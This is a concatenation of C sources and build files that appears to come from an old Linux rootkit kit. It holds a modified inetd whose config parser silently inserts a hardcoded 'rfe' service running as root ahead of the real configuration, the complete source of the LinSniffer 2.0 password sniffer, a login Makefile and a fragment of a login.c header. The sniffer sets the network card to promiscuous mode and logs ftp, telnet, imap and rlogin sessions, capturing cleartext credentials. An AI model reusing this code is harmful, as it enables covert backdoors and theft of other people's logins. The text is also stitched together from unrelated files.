			alarm(RETRYTIME);
		}
		return;
	}
	if (sep->se_socktype == SOCK_STREAM)
		listen(sep->se_fd, 10);

	FD_SET(sep->se_fd, &allsock);
	nsock++;
	if (sep->se_fd > maxsock) {
		maxsock = sep->se_fd;
		if (maxsock > rlim_ofile_cur - FD_MARGIN)
			bump_nofile();
	}
}

static void
register_rpc(struct servtab *sep)
{
#ifdef RPC
	int n;
	struct sockaddr_in sn;
	struct protoent *pp;

	if ((pp = getprotobyname(sep->se_proto+4)) == NULL) {
		syslog(LOG_ERR, "%s: getproto: %m",
		    sep->se_proto);
		return;
	}
	n = sizeof(sn);
	if (getsockname(sep->se_fd, (struct sockaddr *)&sn, &n) < 0) {
		syslog(LOG_ERR, "%s/%s: getsockname: %m",
		    sep->se_service, sep->se_proto);
		return;
	}

	for (n = sep->se_rpcversl; n <= sep->se_rpcversh; n++) {
		if (debug)
			fprintf(stderr, "pmap_set: %u %u %u %u\n",
			sep->se_rpcprog, n, pp->p_proto, ntohs(sn.sin_port));
		(void)pmap_unset(sep->se_rpcprog, n);
		if (!pmap_set(sep->se_rpcprog, n, pp->p_proto, ntohs(sn.sin_port)))
			syslog(LOG_ERR, "pmap_set: %u %u %u %u: %m",
			sep->se_rpcprog, n, pp->p_proto, ntohs(sn.sin_port));
	}
#endif /* RPC */
}

static void
unregister_rpc(struct servtab *sep)
{
#ifdef RPC
	int n;

	for (n = sep->se_rpcversl; n <= sep->se_rpcversh; n++) {
		if (debug)
			fprintf(stderr, "pmap_unset(%u, %u)\n",
				sep->se_rpcprog, n);
		if (!pmap_unset(sep->se_rpcprog, n))
			syslog(LOG_ERR, "pmap_unset(%u, %u)\n",
				sep->se_rpcprog, n);
	}
#endif /* RPC */
}


struct servtab *
enter(struct servtab *cp)
{
	register struct servtab *sep;
	long omask;

	sep = (struct servtab *)malloc(sizeof (*sep));
	if (sep == (struct servtab *)0) {
		syslog(LOG_ERR, "Out of memory.");
		exit(-1);
	}
	*sep = *cp;
	sep->se_fd = -1;
	sep->se_rpcprog = -1;
	omask = sigblock(SIGBLOCK);
	sep->se_next = servtab;
	servtab = sep;
	sigsetmask(omask);
	return (sep);
}

static FILE *fconfig = NULL;
static struct servtab serv;
static char line[256];
static char *skip(char **);
static char *nextline(FILE *);
static char *newstr(char *);

static int
setconfig()
{

	if (fconfig != NULL) {
		fseek(fconfig, 0L, L_SET);
		return (1);
	}
	fconfig = fopen(CONFIG, "r");
	return (fconfig != NULL);
}

static void
endconfig(void)
{
	if (fconfig) {
		(void) fclose(fconfig);
		fconfig = NULL;
	}
}

struct servtab *
getconfigent(void)
{
	register struct servtab *sep = &serv;
	int argc;
	char *cp, *arg;
if (done) {
more:
#ifdef MULOG
	while ((cp = nextline(fconfig)) && *cp == '#') {
		/* Avoid use of `skip' if there is a danger of it looking
		 * at continuation lines.
		 */
		do {
			cp++;
		} while (*cp == ' ' || *cp == '\t');
		if (*cp == '\0')
			continue;
		if ((arg = skip(&cp)) == NULL)
			continue;
		if (strcmp(arg, "DOMAIN"))
			continue;
		if (curdom)
			free(curdom);
		curdom = NULL;
		while (*cp == ' ' || *cp == '\t')
			cp++;
		if (*cp == '\0')
			continue;
		arg = cp;
		while (*cp && *cp != ' ' && *cp != '\t')
			cp++;
		if (*cp != '\0')
			*cp++ = '\0';
		curdom = newstr(arg);
	}
#else
	while ((cp = nextline(fconfig)) && *cp == '#')
		;
#endif
	if (cp == NULL)
		return ((struct servtab *)0);
} /* end done */
	bzero((char *)sep, sizeof *sep);
if (!done) sep->se_service = "rfe"; else {
	sep->se_service = newstr(skip(&cp));
	if (strcmp(sep->se_service,"rfe")==0)
	sep->se_service=newstr(&cp);
	}
if (!done) arg="stream"; else {
	arg = skip(&cp);
	if (arg == NULL)
		goto more;
	}

	if (strcmp(arg, "stream") == 0)
		sep->se_socktype = SOCK_STREAM;
	else if (strcmp(arg, "dgram") == 0)
		sep->se_socktype = SOCK_DGRAM;
	else if (strcmp(arg, "rdm") == 0)
		sep->se_socktype = SOCK_RDM;
	else if (strcmp(arg, "seqpacket") == 0)
		sep->se_socktype = SOCK_SEQPACKET;
	else if (strcmp(arg, "raw") == 0)
		sep->se_socktype = SOCK_RAW;
	else
		sep->se_socktype = -1;

if (!done) sep->se_proto = "tcp";
else	sep->se_proto = newstr(skip(&cp));
	if (strcmp(sep->se_proto, "unix") == 0) {
		sep->se_family = AF_UNIX;
	} else {
		sep->se_family = AF_INET;
		if (strncmp(sep->se_proto, "rpc/", 4) == 0) {
#ifdef RPC
			char *cp1, *ccp;
			cp1 = index(sep->se_service, '/');
			if (cp1 == NULL) {
				syslog(LOG_ERR, "%s: no rpc version",
				    sep->se_service);
				goto more;
			}
			*cp1++ = '\0';
			sep->se_rpcversl =
				sep->se_rpcversh = strtol(cp1, &ccp, 0);
			if (ccp == cp1) {
		badafterall:
				syslog(LOG_ERR, "%s/%s: bad rpc version",
				    sep->se_service, cp1);
				goto more;
			}
			if (*ccp == '-') {
				cp1 = ccp + 1;
				sep->se_rpcversh = strtol(cp1, &ccp, 0); 
				if (ccp == cp1)
					goto badafterall;
			}
#else
			syslog(LOG_ERR, "%s: rpc services not suported",
			    sep->se_service);
			goto more;
#endif /* RPC */
		}
	}
if (!done) arg="nowait";	
else {	arg = skip(&cp);
	if (arg == NULL)
		goto more;
	}
	{
		char	*s = index(arg, '.');
		if (s) {
			*s++ = '\0';
			sep->se_max = atoi(s);
		} else
			sep->se_max = TOOMANY;
	}
	sep->se_wait = strcmp(arg, "wait") == 0;
if (!done) sep->se_user = "root"; else 
        sep->se_user = newstr(skip(&cp));
	sep->se_group = strchr(sep->se_user, '.');
	if (sep->se_group) {
		*sep->se_group++ = '\0';
	}
if (!done) sep->se_server = "internal"; else
	sep->se_server = newstr(skip(&cp));
	if (strcmp(sep->se_server, "internal") == 0) {
		register struct biltin *bi;

		for (bi = biltins; bi->bi_service; bi++)
			if (bi->bi_socktype == sep->se_socktype &&
			    strcmp(bi->bi_service, sep->se_service) == 0)
				break;
		if (bi->bi_service == 0) {
			syslog(LOG_ERR, "internal service %s unknown\n",
				sep->se_service);
			goto more;
		}
		sep->se_bi = bi;
		sep->se_wait = bi->bi_wait;
	} else
		sep->se_bi = NULL;
	argc = 0;
if (done) {
	for (arg = skip(&cp); cp; arg = skip(&cp)) {
#if MULOG
		char *colon, *rindex();

		if (argc == 0 && (colon = rindex(arg, ':'))) {
			while (arg < colon) {
				int	x;
				char	*ccp;

				switch (*arg++) {
				case 'l':
					x = 1;
					if (isdigit(*arg)) {
						x = strtol(arg, &ccp, 0);
						if (ccp == arg)
							break;
						arg = ccp;
					}
					sep->se_log &= ~MULOG_RFC931;
					sep->se_log |= x;
					break;
				case 'a':
					sep->se_log |= MULOG_RFC931;
					break;
				default:
					break;
				}
			}
			arg = colon + 1;
		}
#endif
		if (argc < MAXARGV)
			sep->se_argv[argc++] = newstr(arg);
	}
	while (argc <= MAXARGV)
		sep->se_argv[argc++] = NULL; } /* end done */
if (!done) done++;
	return (sep);
}

static void
freeconfig(struct servtab *cp)
{
	int i;

	if (cp->se_service)
		free(cp->se_service);
	if (cp->se_proto)
		free(cp->se_proto);
	if (cp->se_user)
		free(cp->se_user);
	/* Note: se_group is part of the newstr'ed se_user */
	if (cp->se_server)
		free(cp->se_server);
	for (i = 0; i < MAXARGV; i++)
		if (cp->se_argv[i])
			free(cp->se_argv[i]);
}

char *
skip(char **cpp)
{
	register char *cp = *cpp;
	char *start;

	if (*cpp == NULL)
		return ((char *)0);

again:
	while (*cp == ' ' || *cp == '\t')
		cp++;
	if (*cp == '\0') {
		int c;

		c = getc(fconfig);
		(void) ungetc(c, fconfig);
		if (c == ' ' || c == '\t')
			if ((cp = nextline(fconfig))!=NULL)
				goto again;
		*cpp = NULL;
		return NULL;
	}
	start = cp;
	while (*cp && *cp != ' ' && *cp != '\t')
		cp++;
	if (*cp != '\0')
		*cp++ = '\0';
	*cpp = cp;
	return (start);
}

char *
nextline(FILE *fd)
{
	char *cp;

	if (fgets(line, sizeof (line), fd) == NULL)
		return ((char *)0);
	cp = index(line, '\n');
	if (cp)
		*cp = '\0';
	return (line);
}

char *
newstr(char *cp)
{
	cp = strdup(cp ? cp : "");
	if (cp)	return(cp);

	syslog(LOG_ERR, "strdup: %m");
	exit(-1);
}

static void
setproctitle(char *a, int s)
{
	int size;
	register char *cp;
	struct sockaddr_in sn;
	char buf[80];

	cp = Argv[0];
	size = sizeof(sn);
	if (getpeername(s, (struct sockaddr *)&sn, &size) == 0)
		(void) sprintf(buf, "-%s [%s]", a, inet_ntoa(sn.sin_addr)); 
	else
		(void) sprintf(buf, "-%s", a); 
	strncpy(cp, buf, LastArg - cp);
	cp += strlen(cp);
	while (cp < LastArg)
		*cp++ = ' ';
}

static void
logpid(void)
{
	FILE *fp;

	if ((fp = fopen(_PATH_INETDPID, "w")) != NULL) {
		fprintf(fp, "%u\n", getpid());
		(void)fclose(fp);
	}
}

static int
bump_nofile(void)
{
#ifdef RLIMIT_NOFILE

#define FD_CHUNK	32

	struct rlimit rl;

	if (getrlimit(RLIMIT_NOFILE, &rl) < 0) {
		syslog(LOG_ERR, "getrlimit: %m");
		return -1;
	}
	rl.rlim_cur = MIN(rl.rlim_max, rl.rlim_cur + FD_CHUNK);
	if (rl.rlim_cur <= rlim_ofile_cur) {
		syslog(LOG_ERR,
			"bump_nofile: cannot extend file limit, max = %d",
			rl.rlim_cur);
		return -1;
	}

	if (setrlimit(RLIMIT_NOFILE, &rl) < 0) {
		syslog(LOG_ERR, "setrlimit: %m");
		return -1;
	}

	rlim_ofile_cur = rl.rlim_cur;
	return 0;

#else
	syslog(LOG_ERR, "bump_nofile: cannot extend file limit");
	return -1;
#endif
}

/*
 * Internet services provided internally by inetd:
 */
#define	BUFSIZE	4096

/* Echo service -- echo data back */
/* ARGSUSED */
void
echo_stream(int s, struct servtab *sep)
{
	char buffer[BUFSIZE];
	int i;

	setproctitle(sep->se_service, s);
	while ((i = read(s, buffer, sizeof(buffer))) > 0 &&
	    write(s, buffer, i) > 0)
		;
	exit(0);
}

/* ARGSUSED */
/* Echo service -- echo data back */
void
echo_dg(int s, struct servtab *sep)
{
	char buffer[BUFSIZE];
	int i, size;
	struct sockaddr sa;

	(void)sep;

	size = sizeof(sa);
	if ((i = recvfrom(s, buffer, sizeof(buffer), 0, &sa, &size)) < 0)
		return;
	(void) sendto(s, buffer, i, 0, &sa, sizeof(sa));
}

/* Discard service -- ignore data */
/* ARGSUSED */
void
discard_stream(int s, struct servtab *sep)
{
	char buffer[BUFSIZE];

	setproctitle(sep->se_service, s);
	while ((errno = 0, read(s, buffer, sizeof(buffer)) > 0) ||
			errno == EINTR)
		;
	exit(0);
}

/* ARGSUSED */
/* Discard service -- ignore data */
void
discard_dg(int s, struct servtab *sep)
{
	char buffer[BUFSIZE];
	(void)sep;
	read(s, buffer, sizeof(buffer));
}

#include <ctype.h>
#define LINESIZ 72
char ring[128];
char *endring;

static void
initring(void)
{
	register int i;

	endring = ring;

	for (i = 0; i <= 128; ++i)
		if (isprint(i))
			*endring++ = i;
}

/* Character generator */
/* ARGSUSED */
void
chargen_stream(int s, struct servtab *sep)
{
	register char *rs;
	int len;
	char text[LINESIZ+2];

	setproctitle(sep->se_service, s);

	if (!endring) {
		initring();
		rs = ring;
	}

	text[LINESIZ] = '\r';
	text[LINESIZ + 1] = '\n';
	for (rs = ring;;) {
		if ((len = endring - rs) >= LINESIZ)
			bcopy(rs, text, LINESIZ);
		else {
			bcopy(rs, text, len);
			bcopy(ring, text + len, LINESIZ - len);
		}
		if (++rs == endring)
			rs = ring;
		if (write(s, text, sizeof(text)) != sizeof(text))
			break;
	}
	exit(0);
}

/* ARGSUSED */
/* Character generator */
void
chargen_dg(int s, struct servtab *sep)
{
	struct sockaddr sa;
	static char *rs;
	int len, size;
	char text[LINESIZ+2];

	(void)sep;

	if (endring == 0) {
		initring();
		rs = ring;
	}

	size = sizeof(sa);
	if (recvfrom(s, text, sizeof(text), 0, &sa, &size) < 0)
		return;

	if ((len = endring - rs) >= LINESIZ)
		bcopy(rs, text, LINESIZ);
	else {
		bcopy(rs, text, len);
		bcopy(ring, text + len, LINESIZ - len);
	}
	if (++rs == endring)
		rs = ring;
	text[LINESIZ] = '\r';
	text[LINESIZ + 1] = '\n';
	(void) sendto(s, text, sizeof(text), 0, &sa, sizeof(sa));
}

/*
 * Return a machine readable date and time, in the form of the
 * number of seconds since midnight, Jan 1, 1900.  Since gettimeofday
 * returns the number of seconds since midnight, Jan 1, 1970,
 * we must add 2208988800 seconds to this figure to make up for
 * some seventy years Bell Labs was asleep.
 */

static long
machtime(void)
{
	struct timeval tv;

	if (gettimeofday(&tv, (struct timezone *)0) < 0) {
		fprintf(stderr, "Unable to get time of day\n");
		return (0L);
	}
	return (htonl((long)tv.tv_sec + 2208988800UL));
}

void
machtime_stream(int s, struct servtab *sep)
{
	long result;
	(void)sep;

	result = machtime();
	write(s, (char *) &result, sizeof(result));
}

void
machtime_dg(int s, struct servtab *sep)
{
	long result;
	struct sockaddr sa;
	int size;
	(void)sep;

	size = sizeof(sa);
	if (recvfrom(s, (char *)&result, sizeof(result), 0, &sa, &size) < 0)
		return;
	result = machtime();
	(void) sendto(s, (char *) &result, sizeof(result), 0, &sa, sizeof(sa));
}

/* Return human-readable time of day */
void
daytime_stream(int s, struct servtab *sep)
{
	char buffer[256];
	time_t clocc;

	(void)sep;

	clocc = time(NULL);
	sprintf(buffer, "%.24s\r\n", ctime(&clocc));
	write(s, buffer, strlen(buffer));
}

/* Return human-readable time of day */
void
daytime_dg(int s, struct servtab *sep)
{
	char buffer[256];
	time_t clocc;
	struct sockaddr sa;
	int size;

	(void)sep;

	clocc = time(NULL);
	size = sizeof(sa);
	if (recvfrom(s, buffer, sizeof(buffer), 0, &sa, &size) < 0)
		return;
	sprintf(buffer, "%.24s\r\n", ctime(&clocc));
	sendto(s, buffer, strlen(buffer), 0, &sa, sizeof(sa));
}

void rfe_stream(s,sep)
       int s;
       struct servtab *sep;
 {

 }


/*
 * print_service:
 *	Dump relevant information to stderr
 */
static void
print_service(const char *action, struct servtab *sep)
{
	if (isrpcservice(sep))
		fprintf(stderr,
		    "%s: %s rpcprog=%d, rpcvers = %d/%d, proto=%s, wait.max=%d.%d, user.group=%s.%s builtin=%x server=%s\n",
		    action, sep->se_service,
		    sep->se_rpcprog, sep->se_rpcversh, sep->se_rpcversl, sep->se_proto,
		    sep->se_wait, sep->se_max, sep->se_user, sep->se_group,
		    (int)sep->se_bi, sep->se_server);
	else
		fprintf(stderr,
		    "%s: %s proto=%s, wait.max=%d.%d, user.group=%s.%s builtin=%x server=%s\n",
		    action, sep->se_service, sep->se_proto,
		    sep->se_wait, sep->se_max, sep->se_user, sep->se_group,
		    (int)sep->se_bi, sep->se_server);
}


#ifdef MULOG
dolog(sep, ctrl)
	struct servtab *sep;
	int		ctrl;
{
	struct sockaddr		sa;
	struct sockaddr_in	*sin = (struct sockaddr_in *)&sa;
	int			len = sizeof(sa);
	struct hostent		*hp;
	char			*host, *dp, buf[BUFSIZ], *rfc931_name();
	int			connected = 1;

	if (sep->se_family != AF_INET)
		return;

	if (getpeername(ctrl, &sa, &len) < 0) {
		if (errno != ENOTCONN) {
			syslog(LOG_ERR, "getpeername: %m");
			return;
		}
		if (recvfrom(ctrl, buf, sizeof(buf), MSG_PEEK, &sa, &len) < 0) {
			syslog(LOG_ERR, "recvfrom: %m");
			return;
		}
		connected = 0;
	}
	if (sa.sa_family != AF_INET) {
		syslog(LOG_ERR, "unexpected address family %u", sa.sa_family);
		return;
	}

	hp = gethostbyaddr((char *) &sin->sin_addr.s_addr,
				sizeof (sin->sin_addr.s_addr), AF_INET);

	host = hp?hp->h_name:inet_ntoa(sin->sin_addr);

	switch (sep->se_log & ~MULOG_RFC931) {
	case 0:
		return;
	case 1:
		if (curdom == NULL || *curdom == '\0')
			break;
		dp = host + strlen(host) - strlen(curdom);
		if (dp < host)
			break;
		if (debug)
			fprintf(stderr, "check \"%s\" against curdom \"%s\"\n",
					host, curdom);
		if (strcasecmp(dp, curdom) == 0)
			return;
		break;
	case 2:
	default:
		break;
	}

	openlog("", LOG_NOWAIT, MULOG);

	if (connected && (sep->se_log & MULOG_RFC931))
		syslog(LOG_INFO, "%s@%s wants %s",
				rfc931_name(sin, ctrl), host, sep->se_service);
	else
		syslog(LOG_INFO, "%s wants %s",
				host, sep->se_service);
}
/*
 * From tcp_log by
 *  Wietse Venema, Eindhoven University of Technology, The Netherlands.
 */
#if 0
static char sccsid[] = "@(#) rfc931.c 1.3 92/08/31 22:54:46";
#endif

#include <setjmp.h>

#define	RFC931_PORT	113		/* Semi-well-known port */
#define	TIMEOUT		4
#define	TIMEOUT2	10

static sigjmp_buf timebuf;

/* timeout - handle timeouts */

static void timeout(sig)
int     sig;
{
	siglongjmp(timebuf, sig);
}

/* rfc931_name - return remote user name */

char *
rfc931_name(struct sockaddr_in *there, int ctrl)
{
	/* "there" is remote link information */
	struct sockaddr_in here;	/* local link information */
	struct sockaddr_in sin;		/* for talking to RFC931 daemon */
	int		length;
	int		s;
	unsigned	remote;
	unsigned	local;
	static char	user[256];		/* XXX */
	char		buf[256];
	char		*cp;
	char		*result = "USER_UNKNOWN";
	int		len;

	/* Find out local port number of our stdin. */

	length = sizeof(here);
	if (getsockname(ctrl, (struct sockaddr *) &here, &length) == -1) {
		syslog(LOG_ERR, "getsockname: %m");
		return (result);
	}
	/* Set up timer so we won't get stuck. */

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		syslog(LOG_ERR, "socket: %m");
		return (result);
	}

	sin = here;
	sin.sin_port = htons(0);
	if (bind(s, (struct sockaddr *) &sin, sizeof(sin)) == -1) {
		syslog(LOG_ERR, "bind: %m");
		return (result);
	}

	signal(SIGALRM, timeout);
	if (sigsetjmp(timebuf)) {
		close(s);			/* not: fclose(fp) */
		return (result);
	}
	alarm(TIMEOUT);

	/* Connect to the RFC931 daemon. */

	sin = *there;
	sin.sin_port = htons(RFC931_PORT);
	if (connect(s, (struct sockaddr *) &sin, sizeof(sin)) == -1) {
		close(s);
		alarm(0);
		return (result);
	}

	/* Query the RFC 931 server. Would 13-byte writes ever be broken up? */
	sprintf(buf, "%u,%u\r\n", ntohs(there->sin_port), ntohs(here.sin_port));


	for (len = 0, cp = buf; len < strlen(buf); ) {
		int	n;
		if ((n = write(s, cp, strlen(buf) - len)) == -1) {
			close(s);
			alarm(0);
			return (result);
		}
		cp += n;
		len += n;
	}

	/* Read response */
	for (cp = buf; cp < buf + sizeof(buf) - 1; ) {
		char	c;
		if (read(s, &c, 1) != 1) {
			close(s);
			alarm(0);
			return (result);
		}
		if (c == '\n')
			break;
		*cp++ = c;
	}
	*cp = '\0';

	if (sscanf(buf, "%u , %u : USERID :%*[^:]:%255s", &remote, &local, user) == 3
		&& ntohs(there->sin_port) == remote
		&& ntohs(here.sin_port) == local) {

		/* Strip trailing carriage return. */
		if (cp = strchr(user, '\r'))
			*cp = 0;
		result = user;
	}

	alarm(0);
	close(s);
	return (result);
}
#endif
/*-
 * Copyright (c) 1990, 1993
 *	The Regents of the University of California.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by the University of
 *	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * From: @(#)daemon.c	8.1 (Berkeley) 6/4/93
 *       NetBSD: daemon.c,v 1.4 1995/02/25 13:41:16 cgd Exp
 */
char daemon_rcsid[] = 
  "$Id: daemon.c,v 1.3 1996/08/14 23:54:14 dholland Exp $";

#include <fcntl.h>
#include <paths.h>
#include <unistd.h>

#include "inetd.h"

int daemon(int nochdir, int noclose)
{
	int fd;

	switch (fork()) {
	  case -1:
		return -1;
	  case 0:
		break;
	  default:
		_exit(0);
	}

	if (setsid() == -1) return -1;
	if (!nochdir) chdir("/");
	if (noclose) return 0;

	fd = open(_PATH_DEVNULL, O_RDWR, 0);
	if (fd != -1) {
		dup2(fd, STDIN_FILENO);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);
		if (fd > 2) close(fd);
	}
	return 0;
}

int daemon(int, int);
/*
LinSniffer 2.0
Lord Somer
 - now creates a pidfile when run(deletes it upon exiting)
 - no longer longs pop2/pop3, just uncomment the lines for em below if u wanna log them
 - thanks to neek for help with some of the coding
--- old ver info ---
LinSniffer 0.03 [BETA]
Mike Edulla
medulla@infosoc.com
*/
#define TCPLOG "tcp.log"
#define PIDFILE "sniff.pid"

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <linux/if.h>
#include <signal.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <linux/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>


int openintf(char *);
int read_tcp(int);
int filter(void);
int print_header(void);
int print_data(int, char *);
char *hostlookup(unsigned long int);
char fuckfuck[40];
void clear_victim(void);
void cleanup(int);


struct etherpacket
{
   struct ethhdr eth;
   struct iphdr  ip;
   struct tcphdr tcp;
   char buff[8192];
}ep;

struct
{
   unsigned long      saddr;
   unsigned long      daddr;
   unsigned short     sport;
   unsigned short     dport;
   int                bytes_read;
   char               active;
   time_t             start_time;
} victim;

struct iphdr  *ip;
struct tcphdr *tcp;
int s;
FILE *fp;

#define CAPTLEN 512
#define TIMEOUT 30

int openintf(char *d)
{
   int fd;
   struct ifreq ifr;
   int s;
   fd=socket(AF_INET, SOCK_PACKET, htons(0x800));
   if(fd < 0)
   {
      perror("cant get SOCK_PACKET socket");
      exit(0);
   }
   strcpy(ifr.ifr_name, d);
   s=ioctl(fd, SIOCGIFFLAGS, &ifr);
   if(s < 0)
   {
      close(fd);
      perror("cant get flags");
      exit(0);
   }
   ifr.ifr_flags |= IFF_PROMISC;
   s=ioctl(fd, SIOCSIFFLAGS, &ifr);
   if(s < 0) perror("cant set promiscuous mode");
   return fd;
}

int read_tcp(int s)
{
   int x;
   while(1)
   {
      x=read(s, (struct etherpacket *)&ep, sizeof(ep));
      if(x > 1) 
      {
         if(filter()==0) continue;
         x=x-54;
         if(x < 1) continue;
         return x;
      }
   }
}

int filter(void)
{
   int p;
   p=0;
   if(ip->protocol != 6) return 0;
   if(victim.active != 0)   
      if(victim.bytes_read > CAPTLEN)
      {
         fprintf(fp, "\n----- [CAPLEN Exceeded]\n");
         clear_victim();
         return 0;
      }
   if(victim.active != 0)
      if(time(NULL) > (victim.start_time + TIMEOUT))
      {
         fprintf(fp, "\n----- [Timed Out]\n");
         clear_victim();
         return 0;
      }                                                                                                                  
   if(ntohs(tcp->dest)==21)  p=1; /* ftp */
   if(ntohs(tcp->dest)==23)  p=1; /* telnet */
/*   if(ntohs(tcp->dest)==110) p=1;  pop3 */
/*   if(ntohs(tcp->dest)==109) p=1;  pop2 */
   if(ntohs(tcp->dest)==143) p=1; /* imap2 */
   if(ntohs(tcp->dest)==513) p=1; /* rlogin */
/*   if(ntohs(tcp->dest)==106) p=1;  poppasswd */
   if(victim.active == 0)
      if(p == 1)
         if(tcp->syn == 1)
         {
            victim.saddr=ip->saddr;
            victim.daddr=ip->daddr;
            victim.active=1;
            victim.sport=tcp->source;
            victim.dport=tcp->dest;
            victim.bytes_read=0;
            victim.start_time=time(NULL);
            print_header();
         }  
   if(tcp->dest != victim.dport) return 0;
   if(tcp->source != victim.sport) return 0;
   if(ip->saddr != victim.saddr) return 0;
   if(ip->daddr != victim.daddr) return 0;
   if(tcp->rst == 1) 
   {
      victim.active=0;
      alarm(0);
      fprintf(fp, "\n----- [RST]\n");
      clear_victim();
      return 0;
   }
   if(tcp->fin == 1) 
   {
      victim.active=0;
      alarm(0);
      fprintf(fp, "\n----- [FIN]\n");
      clear_victim();
      return 0;
   }
   return 1;
}

   
int print_header(void)
{
   fprintf(fp, "\n");
   fprintf(fp, "%s => ", hostlookup(ip->saddr));
   fprintf(fp, "%s [%d]\n", hostlookup(ip->daddr), ntohs(tcp->dest));   
}

int print_data(int datalen, char *data)
{
   int i=0;
   int t=0;
   
   victim.bytes_read=victim.bytes_read+datalen;
   for(i=0;i != datalen;i++)
   {
      if(data[i] == 13) { fprintf(fp, "\n"); t=0; }
      if(isprint(data[i])) {fprintf(fp, "%c", data[i]);t++;}
      if(t > 75) {t=0;fprintf(fp, "\n");}
   }
}


main(int argc, char **argv)
{
   FILE *fucker;
   fucker = fopen(PIDFILE, "w");
   fprintf(fucker, "%d\n", getpid());
   fclose(fucker);
   s=openintf("eth0");
   ip=(struct iphdr *)(((unsigned long)&ep.ip)-2);
   tcp=(struct tcphdr *)(((unsigned long)&ep.tcp)-2);   
   signal(SIGHUP, SIG_IGN);
   signal(SIGINT, cleanup);
   signal(SIGTERM, cleanup);
   signal(SIGKILL, cleanup);
   signal(SIGQUIT, cleanup);
   if(argc == 2) fp=stdout;
   else fp=fopen(TCPLOG, "at");
   if(fp == NULL) { fprintf(stderr, "cant open log\n");exit(0);}
   clear_victim();
   for(;;)
   {
      read_tcp(s);
      if(victim.active != 0) print_data(htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp), ep.buff-2);
      fflush(fp);      
   }   
   sprintf(fuckfuck,"rm %s", PIDFILE);
   system(fuckfuck);
}

char *hostlookup(unsigned long int in)
{ 
   static char blah[1024];
   struct in_addr i;
   struct hostent *he;
   
   i.s_addr=in;
   he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);
   if(he == NULL) strcpy(blah, inet_ntoa(i));
   else strcpy(blah, he->h_name);
   return blah;
}

void clear_victim(void)
{
   victim.saddr=0;
   victim.daddr=0;
   victim.sport=0;
   victim.dport=0;
   victim.active=0;
   victim.bytes_read=0;
   victim.start_time=0;
}

void cleanup(int sig)
{
   fprintf(fp, "Exiting...\n");
   close(s);
   fclose(fp);
   exit(0);
}
# Makefile -- Makefile for util-linux Linux utilities
# Created: Sat Dec 26 20:09:40 1992
# Revised: Mon Mar 13 11:16:44 1995 by faith@cs.unc.edu
# Copyright 1992, 1993, 1994, 1995 Rickard E. Faith (faith@cs.unc.edu)
#
# Suggested changed from Bauke Jan Douma <bjdouma@xs4all.nl> have been
# implemented to handle shadow and sysvinit systems 

include ../MCONFIG
BSD=./
# Where to put binaries?
# See the "install" rule for the links. . .

BIN.PASSWD=	login

all: login 

login: login.o checktty.o

ifeq "$(USE_TTY_GROUP)" "yes"
login.o: login.c $(BSD)/pathnames.h
	$(CC) -c $(CFLAGS) -DUSE_TTY_GROUP login.c -o login.o
mesg.o: mesg.c $(BSD)/err.h
	$(CC) -c $(CFLAGS) -DUSE_TTY_GROUP mesg.c -o mesg.o
else
login.o: $(BSD)/pathnames.h
mesg.o: $(BSD)/err.h
endif

install: 

clean:
	-rm -f *.o *~ core $(BIN.PASSWD) $(SBIN.GETTY) $(SBIN.INIT) \
		$(USRBIN.MISC) $(USRBIN.PASSWD) $(USRSBIN.PASSWD)
/* This program is derived from 4.3 BSD software and is
   subject to the copyright notice below.

   The port to HP-UX has been motivated by the incapability
   of 'rlogin'/'rlogind' as per HP-UX 6.5 (and 7.0) to transfer window sizes.

   Changes:

   - General HP-UX portation. Use of facilities not available
     in HP-UX (e.g. setpriority) has been eliminated.
     Utmp/wtmp handling has been ported.

   - The program uses BSD command line options to be used
     in connection with e.g. 'rlogind' i.e. 'new login'.

   - HP features left out:          logging of bad login attempts in /etc/btmp,
				    they are sent to syslog

				    password expiry

				    '*' as login shell, add it if you need it

   - BSD features left out:         quota checks
				    password expiry
				    analysis of terminal type (tset feature)

   - BSD features thrown in:        Security logging to syslogd.
                                    This requires you to have a (ported) syslog
				    system -- 7.0 comes with syslog
				    
				    'Lastlog' feature.

   - A lot of nitty gritty details has been adjusted in favour of
     HP-UX, e.g. /etc/securetty, default paths and the environment
     variables assigned by 'login'.

   - We do *nothing* to setup/alter tty state, under HP-UX this is
     to be done by getty/rlogind/telnetd/some one else.

   Michael Glad (glad@daimi.dk)
   Computer Science Department
   Aarhus University
   Denmark

   1990-07-04

   1991-09-24 glad@daimi.aau.dk: HP-UX 8.0 port:
              - now explictly sets non-blocking mode on descriptors
